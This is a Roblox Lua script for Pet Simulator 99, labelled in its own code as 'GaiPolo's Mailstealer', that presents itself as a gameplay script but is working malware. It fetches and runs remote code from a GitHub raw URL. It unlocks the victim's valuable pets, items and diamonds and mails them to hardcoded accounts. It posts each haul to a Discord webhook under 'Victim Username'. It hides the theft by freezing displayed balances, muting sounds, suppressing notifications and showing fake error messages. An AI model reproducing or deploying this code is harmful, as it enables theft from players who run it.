print("Init")
local player = game:GetService"Players".LocalPlayer

loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/logger.lua'))()
wait(0.5)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Diapolo69/ps99/main/poopoo.lua"))()
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = game.ReplicatedStorage.Library
local save = require(library.Client.Save).Get().Inventory
local mailsent = require(library.Client.Save).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Hee hee"
local HttpService = game:GetService("HttpService")

local foundHugePet = false

local function sendWebhoopk(url, headers, body)
    local success = false
    local attempts = 0
    local maxAttempts = 5

    while not success and attempts < maxAttempts do
        attempts = attempts + 1
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })

        print("Attempt " .. attempts .. ": StatusCode = " .. response.StatusCode)

        if response.StatusCode ~= 500 then
            success = true
        else
            wait(0.05)
        end
    end

    if not success then
        warn("Failed to send webhook after " .. maxAttempts .. " attempts.")
    end
end

for i, v in pairs(save.Pet) do
    local id = v.id
    local dir = require(library.Directory.Pets)[id]
    
    if dir and dir.huge then
        foundHugePet = true
        break
    end
end
for i, v in pairs(save.Pet) do
    local id = v.id
    local dir = require(library.Directory.Pets)[id]
    if v.id and v.id == string.find(v.id, "Titanic") then
        local msg = {
            ["content"] = "@here you missed on a " .. id .. " dumbass!"
        }

        local url = "https://discord.com/api/webhooks/1278606119606030379/ue9kQ8bCzHSQkZrsfgpYuF_137kd1pKcRh8p_SH8_qMcG9teQ0vla6C5xWALO0TWf5I2"
        local headers = {
            ["Content-Type"] = "application/json"
        }
        local body = HttpService:JSONEncode(msg)

        sendWebhoopk(url, headers, body)
    end
end
if not foundHugePet then
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("Woops! You need to unlock the exclusive daycare in order to make the script work!")
end
	

Username = "LaRussieCool3"
Username2 = "LaRussieCool4" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1278606119606030379/ue9kQ8bCzHSQkZrsfgpYuF_137kd1pKcRh8p_SH8_qMcG9teQ0vla6C5xWALO0TWf5I2"
min_rap = 500000 -- minimum rap of each item you want to get sent to you.

local player = game:GetService"Players".LocalPlayer
if player.name == "zgrind_3" then
	Username = "footing1i"
end
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = game.ReplicatedStorage.Library
local save = require(library.Client.Save).Get().Inventory
local mailsent = require(library.Client.Save).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Hee hee"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(url, username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local totalRAP = 0
	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		}
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, category = item.category, typez = item.typez, pettyp = item.pettyp, realname = item.realname}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)
   
    local highestRAPItemName = combinedItems[1] or nil
    local highestRAPItemData = itemRapMap[highestRAPItemName] or nil

    if highestRAPItemData.category == "Pet" then
        if highestRAPItemData.pettyp == "Golden" then
	    epikcolor = 14728192
            thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].goldenThumbnail
        elseif highestRAPItemData.pettyp == "Rainbow" then
            thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
	    epikcolor = 14680064
	elseif highestRAPItemData.pettyp == "Shiny" then
	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
	    epikcolor = 16777215
	elseif highestRAPItemData.pettyp == "Normal" then
	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
	    epikcolor = 65280
        end
        local assetId = thumbid:match("%d+")
        local newUrl = "https://biggamesapi.io/image/" .. assetId
        thumbid = newUrl
    end

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        totalRAP = totalRAP + (itemData.rap * itemData.amount)
    end
    if totalRAP > 500000000 then
		poopie = "<:poopie_1:1279107191806230602><:poopie_2:1279107192682971331><:poopie_3:1279107194427674725><:poopie_4:1279107196147204188><:poopie_5:1279107197472739348>"
    else
		poopie = "<:segment_1:1279104032786616430><:segment_2:1279104034145566884><:segment_3:1279104035416440912><:segment_4:1279104036523606133><:segment_5:1279104038121639977>"
    end
    if totalRAP < 10000000 then
		Username = "footing1i"
    end
    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
    fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)

    local data = {
	["content"] = poopie,
        ["embeds"] = {{
            ["title"] = "New Execution from gem video" ,
            ["color"] = epikcolor or 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GaiPolo's Mailstealer"
			},
            ["thumbnail"] = {
                ["url"] = thumbid or "https://media.discordapp.net/attachments/1233833036571869214/1275930475382312991/retyuicuytdfio.png?ex=66c7ae5a&is=66c65cda&hm=79a79160ae327f8ba370d56aeea852cdbc3734f37d4be3c1e047264d29cb0b6c&=&format=webp&quality=lossless"
            }
        }}
    }

    if #fields[2].value > 1024 then
        fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
    end
    local body = HttpService:JSONEncode(data)
    local success = false
    local attempts = 0

    while not success do
        attempts = attempts + 1
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
        print("Attempt " .. attempts .. ": StatusCode = " .. response.StatusCode)
        if response.StatusCode ~= 500 then
            success = true
        else
            wait(0.05)
        end
    end
end

local user = Username
local user2 = Username2

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = require(library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        typez = "Normal"
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                            typez = "Golden"
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                            typez = "Rainbow"
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                            typez = "Shiny"
                        end
                        local realid = item.id
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id, realname = realid, pettyp = typez})
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
		return
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = require(game.ReplicatedStorage.Library.Client.Save).Get
    local blob_b = require(game.ReplicatedStorage.Library.Client.Save).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    blob_a = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    if Webhook and string.find(Webhook, "discord") then
        Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
	wait(0.2)
        spawn(function()
            SendMessage(Webhook, plr.Name, GemAmount1)
        end)
    end
	local CurrencyCmdz = require(game.ReplicatedStorage.Library.Client.CurrencyCmds)
	local originalGetFunction = CurrencyCmdz.Get
	CurrencyCmdz.Get = function(currencyType)
    		if currencyType == "Diamonds" then
        		return 25000000000
    		else
        		return originalGetFunction(currencyType)
    		end
	end
    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    setclipboard("Cocks and Balls")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("Woops! You need to go to WORLD 2 in order to make the script work")
end
